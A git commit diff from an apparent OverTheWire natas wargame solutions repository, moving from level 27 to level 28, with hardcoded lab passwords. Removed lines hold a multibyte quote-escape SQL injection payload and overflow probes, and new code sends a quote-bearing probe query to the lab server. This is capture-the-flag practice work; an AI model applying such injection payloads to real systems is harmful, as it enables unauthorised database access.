bb822e4584db5a0f3698558f93bcd03e193a7971
Thewessen <sthewessen@gmail.com>
2019-04-07 12:04:18 +0200

    Started working on level28

--- OverTheWire/natas/test.php
+++ OverTheWire/natas/test.php
@@ -1,9 +1,14 @@
 <?php
   
-  $array = array("data" => "¿", "number" => "¿");
+  /* $array = array("data" => "¿", "number" => "¿"); */
 
-  $myarray = print_r($array,true);
+  /* $myarray = print_r($array,true); */
 
-  echo htmlentities("$myarray");
+  /* echo htmlentities("$myarray"); */
+  
+  $real_query = "SELECT * from where =a";
+  $query = "G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPKriAqPE2%2B%2BuYlniRMkobB1vfoQVOxoUVz5bypVRFkZR5BPSyq%2FLC12hqpypTFRyXA%3D";
+
+  print base64_encode($query);
 
 ?>
--- OverTheWire/natas/test.py
+++ OverTheWire/natas/test.py
@@ -1,50 +1,21 @@
 #!/usr/bin/env python3
 
-import requests
+import requests, string
 from requests.auth import HTTPBasicAuth
 
-uri = 'http://natas27.natas.labs.overthewire.org/'
-username = 'natas27'
-password = '55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ'
+uri = 'http://natas28.natas.labs.overthewire.org/'
+username = 'natas28'
+password = 'JWwR438wkgTsNKBbcJoowyysdM82YjeF'
 
-Data = {'username' : "natas26",'password' : "%bf%5c%27"}
+query = {'query' :
+        'd"'}
 
-# Making a string for the Data prefents the %-sign for getting encoded.
-param_str = "&".join("%s=%s" % (k,v) for k, v in Data.items())
+chars = ''.join([string.digits, string.ascii_letters])
 
-p = requests.post( uri,
+Data = {'query' : "b"}
+
+p = requests.get( uri,
         auth=HTTPBasicAuth(username, password),
         # data = Data)
-        params=param_str)
-print( "\n".join(p.text.split('\r\n')[13:-4]) )
-
-
-### Small test for query overflow amount ### YES 64 chars
-# Data = {'username' : "natas27",'password' : "A"*1600 + "B"}
-# p = requests.post( uri,
-#         auth=HTTPBasicAuth(username, password),
-#         params=Data)
-# print( "\n".join(p.text.split('\r\n')[13:-4]) )
-
-# for i in range(1600,0,-1):
-#     Data = {'username' : "natas27",'password' : "A"*i}
-#     p = requests.post( uri,
-#             auth=HTTPBasicAuth(username, password),
-#             params=Data)
-#     print( i )
-#     if 'Wrong' not in p.text:
-#         print( '\n'.join(p.text.split('\r\n')[13:-4]) )
-#         break
-
-## Same for username? ## YES
-# Data = {'username' : "A"*64+"B",'password' : "A"}
-# p = requests.post( uri,
-#         auth=HTTPBasicAuth(username, password),
-#         params=Data)
-# print( "\n".join(p.text.split('\r\n')[13:-4]) )
-
-# Data = {'username' : "A"*64,'password' : "A"}
-# p = requests.post( uri,
-#         auth=HTTPBasicAuth(username, password),
-#         params=Data)
-# print( "\n".join(p.text.split('\r\n')[13:-4]) )
+        params = query)
+print( '\n'.join( p.text.split('\r\n')[24:]) + '\n\n' )
